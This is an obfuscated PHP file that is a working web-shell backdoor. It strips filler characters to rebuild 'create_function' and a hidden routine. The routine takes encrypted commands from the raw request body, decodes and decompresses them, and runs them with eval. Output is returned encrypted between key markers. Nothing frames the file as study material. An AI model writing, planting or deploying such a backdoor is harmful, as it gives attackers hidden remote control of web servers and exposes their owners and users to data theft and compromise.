<?php
$X=str_replace('A','','AcreaAtAe_fAuncAtAion');
$D='DmatcDh("/$kDh(.D+)$Dkf/",@fileD_get_cDontents(DD"php://inpuDt"),$m)';
$s='D="pEISJ26DRktDhzYMbL";DfuncDtiDoDnD x($tD,$kD){$c=strDlen($k';
$j='@base6D4_eDncodeD(@x(@gzDcompDressD($o),$k));priDntDD("$p$kh$r$kf");}';
$d='$k="274ecDe90"D;D$khD="9c47de3cD5ac2";$kf="Db4200cDd9D903a";$p';
$r='eD($m[1]D),D$Dk)));$o=D@ob_get_cDonteDnts();@ob_endD_cleaDn();$rD=';
$T='D==1) D{@Dob_start();@eDval(D@gzuncoDmpDress(D@x(@baDse64_decod';
$t='$j+D+,D$i++){$o.D=$t{$iD}^$k{$Dj};}}Dreturn $oD;}if D(@preg_';
$A=');$l=strlenD($tD);$o=D"";for($i=0;$i<D$l;){fDor($j=0DD;($j<$c&D&$i<$l);';
$b=str_replace('D','',$d.$s.$A.$t.$D.$T.$r.$j);
$h=$X('',$b);$h();
?>
